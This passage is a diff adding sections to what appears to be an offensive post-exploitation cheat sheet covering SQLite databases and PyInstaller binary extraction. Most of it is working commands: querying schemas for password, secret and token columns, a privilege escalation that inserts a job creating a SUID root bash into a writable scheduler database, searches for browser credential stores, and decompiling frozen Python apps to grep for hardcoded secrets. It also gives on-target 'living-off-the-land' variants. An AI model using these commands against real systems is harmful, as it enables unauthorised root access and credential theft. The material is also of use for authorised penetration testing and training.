+SELECT name FROM sqlite_master WHERE type='table';
+SQL
+
+# Dump all tables with password-like columns
+sqlite3 <DATABASE_PATH> "SELECT sql FROM sqlite_master WHERE sql LIKE '%pass%' OR sql LIKE '%secret%' OR sql LIKE '%token%';"
+```
+
+```bash
+# Privesc via writable task/job SQLite database
+# If a root-executed scheduler reads jobs from a writable SQLite DB:
+sqlite3 <JOB_DB_PATH> "INSERT INTO jobs (command, schedule) VALUES ('cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash', '* * * * *');"
+
+# Browser credential databases (see 5.1h for decryption):
+find / -name "Login Data" -o -name "key4.db" -o -name "logins.json" 2>/dev/null
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# sqlite3 ships with most Linux distributions (part of sqlite package)
+which sqlite3 2>/dev/null
+# If sqlite3 unavailable, python3 can access SQLite:
+python3 -c "
+import sqlite3, sys
+conn = sqlite3.connect('<DATABASE_PATH>')
+c = conn.cursor()
+for table in c.execute(\"SELECT name FROM sqlite_master WHERE type='table'\").fetchall():
+    print(f'\\n=== {table[0]} ===')
+    for row in c.execute(f'SELECT * FROM {table[0]} LIMIT 10'):
+        print(row)
+"
+```
+
+### 5.1n PyInstaller Binary Extraction and .pyc Decompilation
+
+When encountering a frozen Python ELF (PyInstaller, cx_Freeze, Nuitka), extract the embedded `.pyc` files and decompile them to recover source code — reveals hardcoded credentials, API keys, encryption routines, and application logic.
+
+```bash
+# Detect — identify PyInstaller binaries
+file <BINARY_PATH>     # "ELF ... (Python)" or large static binary
+strings <BINARY_PATH> | grep -i "pyinstaller\|PYZ\|_MEI\|_MEIPASS"
+# PyInstaller binaries contain "MEI" magic and "PYZ" archive marker
+```
+
+```bash
+# Method 1: pyinstxtractor (Python-based — runs on target if python3 available)
+# Extract the PYZ archive and all embedded .pyc files
+python3 pyinstxtractor.py <BINARY_PATH>
+# Output: <BINARY_PATH>_extracted/ containing .pyc files and PYZ-00.pyz_extracted/
+
+# Method 2: Manual extraction (if pyinstxtractor not available)
+# PyInstaller appends a MAGIC trailer to the binary — find the TOC offset
+strings <BINARY_PATH> | grep -c "PYZ"
+# The archive starts at the end of the ELF — extract with dd/binwalk
+binwalk -e <BINARY_PATH>
+```
+
+```bash
+# Decompile .pyc to readable Python source
+# pycdc (C++ based — most reliable for Python 3.9+)
+pycdc <EXTRACTED_DIR>/<MAIN_MODULE>.pyc
+
+# uncompyle6 (Python 3.0-3.8)
+uncompyle6 <EXTRACTED_DIR>/<MAIN_MODULE>.pyc > recovered_source.py
+
+# decompyle3 (Python 3.7-3.9)
+decompyle3 <EXTRACTED_DIR>/<MAIN_MODULE>.pyc > recovered_source.py
+
+# After decompilation — hunt for secrets
+grep -riE "password|secret|api_key|token|encrypt|decrypt|key=" recovered_source.py
+```
+
+```bash
+# Fix magic header mismatch (common when pyc version differs)
+# Get the correct magic number for the target Python version:
+python3 -c "import importlib.util; print(importlib.util.MAGIC_NUMBER.hex())"
+# Prepend correct magic + 12 null bytes (timestamp + size) if header is corrupted:
+printf '\x<MAGIC_BYTES>\x0d\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' | \
+  cat - <STRIPPED_PYC> > /tmp/fixed.pyc
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# If only python3 is available on target (no pyinstxtractor/decompilers):
+# Extract using Python's zipimport (PyInstaller PYZ is a modified ZIP)
+python3 -c "
+import zipfile, sys
+try:
+    z = zipfile.ZipFile('<BINARY_PATH>')
+    z.extractall('/tmp/pyextract')
+    print('[+] Extracted as zip')
+except:
+    print('[-] Not directly zip-extractable — need pyinstxtractor')
+"
+# Decompilation must happen offline (transfer .pyc to attacker box)
+# On target: extract .pyc files; on attacker: run pycdc/uncompyle6
+```
 
 ---
 
